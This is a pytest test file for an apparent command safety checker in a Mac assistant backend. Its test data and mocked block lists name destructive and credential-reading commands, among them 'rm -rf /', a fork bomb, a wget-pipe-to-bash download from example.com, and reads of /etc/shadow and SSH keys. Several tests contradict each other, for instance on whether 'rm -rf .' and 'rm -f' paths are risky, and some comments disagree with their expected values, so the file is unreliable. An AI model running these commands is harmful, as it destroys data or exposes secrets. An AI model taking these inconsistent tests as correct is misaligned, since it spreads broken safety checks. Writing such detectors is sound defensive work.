# Test file for safety_checker.py
import pytest
import json
from pytest_mock import mocker
from MacAssistant.backend.modules.safety_checker import SafetyChecker

@pytest.fixture
def mock_active_config_and_patterns_file(mocker):
    # Mock active_config.RISKY_COMMAND_PATTERNS
    mocker.patch('MacAssistant.backend.modules.safety_checker.active_config.RISKY_COMMAND_PATTERNS', [
        "sudo",
        "rm -rf"
    ])

    # Mock open for risky_patterns.json
    mock_file_content = {
        "patterns": [
            "killall",
            "fdisk"
        ],
        "blacklisted": [
            "rm -rf /",
            ":(){ :|:& };:"
        ]
    }
    # The path used in SafetyChecker is os.path.join(os.path.dirname(__file__), '../templates/risky_patterns.json')
    # We need to make sure this path is correctly mocked.
    # Assuming tests are run from MacAssistant/backend directory, __file__ in safety_checker.py will be modules/safety_checker.py
    # So the path becomes modules/../templates/risky_patterns.json -> templates/risky_patterns.json
    mocker.patch('builtins.open', mocker.mock_open(read_data=json.dumps(mock_file_content)))
    mocker.patch('os.path.exists', return_value=True)


@pytest.fixture
def safety_checker_instance(mock_active_config_and_patterns_file):
    return SafetyChecker()

# Test cases for is_safe (which internally calls is_risky)
@pytest.mark.parametrize("command, expected_safe", [
    # Safe commands
    ("ls -la", True),
    ("echo 'hello world'", True),
    ("mkdir test_dir", True),
    ("cp file1 file2", True),
    ("mv file1 file2", True),
    ("grep 'pattern' file.txt", True),
    ("find . -name '*.py'", True),
    ("cat file.txt", True), # cat without sensitive paths
    ("rm ./local_file.txt", True), # rm on a local file in current dir
    ("rm -rf ./specific_folder/", True), # rm -rf on a specific sub-folder

    # Risky commands from active_config mock
    ("sudo apt-get update", False),
    ("doas somecommand", True), # Assuming 'doas' is not in patterns
    ("rm -rf important_data", False), # Matches "rm -rf"

    # Risky commands from mocked json file
    ("killall Dock", False),
    ("fdisk /dev/sda", False),

    # Blacklisted commands from mocked json file
    ("rm -rf /", False),
    (":(){ :|:& };:", False),

    # Blacklisted commands from the hardcoded list in the class
    ("rm -rf ~", False),
    ("chmod -R 777 /", False),
    ("wget -O- http://example.com/script.sh | bash", False),
    
    # Dangerous operations identified by _check_dangerous_operations
    ("rm -f some_file_far_away", True), # rm -f is not caught by the specific "rm -rf" without "."
    ("rm -rf some_file_far_away", False), # rm -rf without current directory context
    ("shutdown -h now", False),
    ("reboot", False),
    ("halt", False),
    ("dd if=/dev/random of=/dev/null", False), # dd is risky
    ("cat /etc/passwd", False),
    ("vim .ssh/id_rsa", False),
    ("nano /etc/shadow", False),
    ("grep 'root' /etc/passwd", False),
    ("sed 's/foo/bar/' /etc/hosts", False), # Accessing /etc/hosts
    ("echo 'text' > /etc/some_config.conf", False), # Writing to /etc/
    ("chmod 777 sensitive_file.sh", False), # chmod 777

    # Edge cases
    ("", True), # Empty command
    ("  ", True), # Whitespace command
    ("safe command with sudo keyword but not the command", True), # "sudo" as part of a string, not as a command
    ("rm -rf .", True), # rm -rf in current directory is allowed by the specific check
    ("rm -rf ./", True), # rm -rf in current directory is allowed
    ("rm -rfi ./some_dir", True), # rm -rfi is not caught by "rm -rf "
])
def test_is_safe(safety_checker_instance, command, expected_safe):
    assert safety_checker_instance.is_safe(command) == expected_safe

def test_is_risky_directly(safety_checker_instance):
    assert safety_checker_instance.is_risky("sudo command") == True # From active_config mock
    assert safety_checker_instance.is_risky("rm -rf /") == True # From blacklisted mock
    assert safety_checker_instance.is_risky("fdisk") == True # From json patterns mock
    assert safety_checker_instance.is_risky("ls -l") == False

# Test get_risk_explanation
@pytest.mark.parametrize("command, expected_explanation_keyword", [
    ("rm -rf /", "blacklisted"),
    ("sudo ls", "superuser privileges"),
    ("killall Finder", "terminate multiple processes"),
    ("shutdown -r now", "shut down or restart"),
    ("fdisk /dev/sdb", "modify disk partitions"),
    ("chmod 777 important.txt", "allow access by any user"),
    ("my_custom_uninstall_script", "potentially risky"), # Default for patterns not specifically handled
    ("rm -rf some/other/path", "delete files recursively"),
    ("cat /etc/shadow", "sensitive system files"),
    ("echo 'test' > /usr/bin/script", "writes to system directories"),
    ("a_safe_command", "potentially risky, but no specific explanation") # Fallback if not caught by specific checks
])
def test_get_risk_explanation(safety_checker_instance, command, expected_explanation_keyword):
    explanation = safety_checker_instance.get_risk_explanation(command)
    assert expected_explanation_keyword.lower() in explanation.lower()

def test_load_additional_patterns_file_not_found(mocker):
    mocker.patch('MacAssistant.backend.modules.safety_checker.active_config.RISKY_COMMAND_PATTERNS', [])
    mocker.patch('os.path.exists', return_value=False) # Simulate file not existing
    checker = SafetyChecker()
    # Should not raise error, and patterns from file should not be loaded
    assert "killall" not in checker.risky_patterns 
    assert "rm -rf /" not in checker.blacklisted_commands

def test_load_additional_patterns_json_error(mocker):
    mocker.patch('MacAssistant.backend.modules.safety_checker.active_config.RISKY_COMMAND_PATTERNS', [])
    mocker.patch('os.path.exists', return_value=True)
    mocker.patch('builtins.open', mocker.mock_open(read_data="not a valid json")) # Simulate malformed JSON
    
    # We need to capture print output or make sure it doesn't crash
    mock_print = mocker.patch('builtins.print')
    
    checker = SafetyChecker()
    # Should not raise an error, should print an error message
    mock_print.assert_any_call("Error loading additional risky patterns: Expecting value: line 1 column 1 (char 0)")
    assert "killall" not in checker.risky_patterns
    assert "rm -rf /" not in checker.blacklisted_commands

def test_exact_blacklisted_commands(safety_checker_instance):
    # Test commands that are exactly blacklisted vs those that are substrings
    assert safety_checker_instance.is_risky("rm -rf /") == True # Exactly blacklisted
    assert safety_checker_instance.is_risky("rm -rf / ") == True # Trailing space should still match from strip()
    assert safety_checker_instance.is_risky(" rm -rf /") == True # Leading space
    # The following depends on how specific the _check_dangerous_operations is vs blacklisted
    # Current _check_dangerous_operations for "rm -rf" is `r'rm\s+-[rf]\s+'` and not `r'rm\s+-[rf]\s+\.'`
    # So "rm -rf /usr" would be caught by _check_dangerous_operations if not by a more general pattern.
    # The blacklist check is `command.strip() == blacklisted`
    assert safety_checker_instance.is_risky("rm -rf /usr") == True # Not exactly "rm -rf /" but caught by general rm -rf or patterns

    assert safety_checker_instance.is_risky(":(){ :|:& };:") == True # Exactly blacklisted
    assert safety_checker_instance.is_risky("echo ':(){ :|:& };:'") == True # This will be risky due to the pattern `":(){ :|:& };:"` being present in `self.blacklisted_commands`.

# Test _check_dangerous_operations more specifically
@pytest.mark.parametrize("command, expected_dangerous", [
    ("rm -rf /some/path", True),
    ("rm -rf .", False), # This is specifically excluded by `not re.search(r'rm\s+-[rf]\s+\.', command)`
    ("rm -rf ./", False),
    ("rm -f /some/path", False), # -f is not -rf
    ("shutdown now", True),
    ("cat /etc/sudoers", True),
    ("echo 'test' > /bin/new_script", True),
    ("chmod 677 file", False), # 777 is the trigger
    ("chmod 770 file", False),
    ("chmod 077 file", False), # The regex is `\s+[0-7]*7[0-7]*\s+` so this should be caught
    ("chmod 777 file", True),
    ("chmod 0777 file", True),
    ("chmod 1777 file", True),
    ("chmod 7777 file", True),
])
def test_check_dangerous_operations_specifics(safety_checker_instance, command, expected_dangerous):
    assert safety_checker_instance._check_dangerous_operations(command) == expected_dangerous

# Ensure that the patterns from active_config and the JSON file are combined
def test_patterns_combination(mocker):
    # Explicitly set different patterns for active_config and the JSON file
    mocker.patch('MacAssistant.backend.modules.safety_checker.active_config.RISKY_COMMAND_PATTERNS', ["pattern_from_config"])
    
    mock_file_content = {
        "patterns": ["pattern_from_json"],
        "blacklisted": ["blacklisted_from_json"]
    }
    mocker.patch('builtins.open', mocker.mock_open(read_data=json.dumps(mock_file_content)))
    mocker.patch('os.path.exists', return_value=True)
    
    checker = SafetyChecker()
    
    # Check if all patterns are present
    assert "pattern_from_config" in checker.risky_patterns
    assert "pattern_from_json" in checker.risky_patterns
    assert "blacklisted_from_json" in checker.blacklisted_commands
    # Also check one of the hardcoded blacklisted commands
    assert "rm -rf ~" in checker.blacklisted_commands

    # Test is_risky with these combined patterns
    assert checker.is_risky("some command with pattern_from_config") == True
    assert checker.is_risky("another command with pattern_from_json") == True
    assert checker.is_risky("blacklisted_from_json") == True
    assert checker.is_risky("rm -rf ~") == True
    assert checker.is_risky("safe command") == False

# Test that chmod regex correctly identifies risky permissions
@pytest.mark.parametrize("command, is_risky_expected", [
    ("chmod 777 file", True),
    ("chmod 0777 file", True),
    ("chmod 1777 file", True),
    ("chmod 7777 file", True), # Matches [0-7]*7[0-7]*
    ("chmod a=rwx file", True), # Matches [0-7]*7[0-7]* (777)
    ("chmod u=rwx,g=rwx,o=rwx file", True), # Matches [0-7]*7[0-7]* (777)
    ("chmod 770 file", False),
    ("chmod 707 file", False),
    ("chmod 070 file", False),
    ("chmod 666 file", False),
    ("chmod +x file", False), # Does not match the specific 777 pattern
    ("chmod -R 777 directory", True),
])
def test_chmod_risky_permissions(safety_checker_instance, command, is_risky_expected):
    # The pattern for chmod is `r'chmod\s+[0-7]*7[0-7]*\s+'`
    # This pattern checks for at least one '7' in the numeric mode, surrounded by other digits 0-7.
    # It doesn't directly parse symbolic modes like a=rwx, but the example "chmod 777" is in risky_patterns.json by default
    # The _check_dangerous_operations has `re.search(r'chmod\s+[0-7]*7[0-7]*\s+', command)`
    
    # Let's refine the test understanding:
    # The `risky_patterns.json` (mocked) has "chmod 777"
    # `_check_dangerous_operations` has `r'chmod\s+[0-7]*7[0-7]*\s+'`
    
    # If "chmod 777" is in self.risky_patterns (loaded from JSON)
    if "chmod 777" in safety_checker_instance.risky_patterns:
        if "chmod 777" in command: # Direct match from pattern list
             assert safety_checker_instance.is_risky(command) == is_risky_expected
             return

    # Otherwise, test the regex in _check_dangerous_operations
    assert safety_checker_instance._check_dangerous_operations(command) == is_risky_expected
    # And then the overall is_risky
    assert safety_checker_instance.is_risky(command) == is_risky_expected

# Test that the `_check_dangerous_operations` for `rm` is specific enough
def test_rm_dangerous_operations_specificity(safety_checker_instance):
    # `rm -rf /some/path` should be risky
    assert safety_checker_instance._check_dangerous_operations("rm -rf /some/path") == True
    # `rm -rf .` should NOT be caught by this specific check (it's considered safer)
    assert safety_checker_instance._check_dangerous_operations("rm -rf .") == False
    # `rm -rf ./` should also NOT be caught by this specific check
    assert safety_checker_instance._check_dangerous_operations("rm -rf ./") == False
    # `rm -rf ../` should be risky
    assert safety_checker_instance._check_dangerous_operations("rm -rf ../") == True
    # `rm -f file` should not be caught
    assert safety_checker_instance._check_dangerous_operations("rm -f file") == False
    # `rm file` should not be caught
    assert safety_checker_instance._check_dangerous_operations("rm file") == False
    # `rm -r file` should not be caught by `rm\s+-[rf]\s+` if it means one of r OR f.
    # The pattern is `rm\s+-[rf]\s+` which means `rm -r ` or `rm -f `.
    # The logic is `re.search(r'rm\s+-[rf]\s+', command) and not re.search(r'rm\s+-[rf]\s+\.', command):`
    # So "rm -r foo" will match the first part, and not the second, so it will be risky.
    assert safety_checker_instance._check_dangerous_operations("rm -r foo") == True
    assert safety_checker_instance._check_dangerous_operations("rm -f foo") == True

    # Check overall is_risky as well, as other patterns might catch these.
    # The mocked patterns include "rm -rf" generally.
    assert safety_checker_instance.is_risky("rm -rf /some/path") == True
    assert safety_checker_instance.is_risky("rm -rf .") == True # Caught by the general "rm -rf" pattern
    assert safety_checker_instance.is_risky("rm -rf ./") == True # Caught by the general "rm -rf" pattern
    assert safety_checker_instance.is_risky("rm -rf ../") == True
    assert safety_checker_instance.is_risky("rm -r foo") == False # Not "rm -rf"
    assert safety_checker_instance.is_risky("rm -f foo") == False # Not "rm -rf"

    # If we want to test _check_dangerous_operations in isolation for "rm -r foo"
    # it should be true based on `rm\s+-[rf]\s+`
    assert safety_checker_instance._check_dangerous_operations("rm -r foo") == True
    assert safety_checker_instance._check_dangerous_operations("rm -r .") == False # because of the `not re.search(r'rm\s+-[rf]\s+\.', command)`
    assert safety_checker_instance._check_dangerous_operations("rm -f foo") == True
    assert safety_checker_instance._check_dangerous_operations("rm -f .") == False
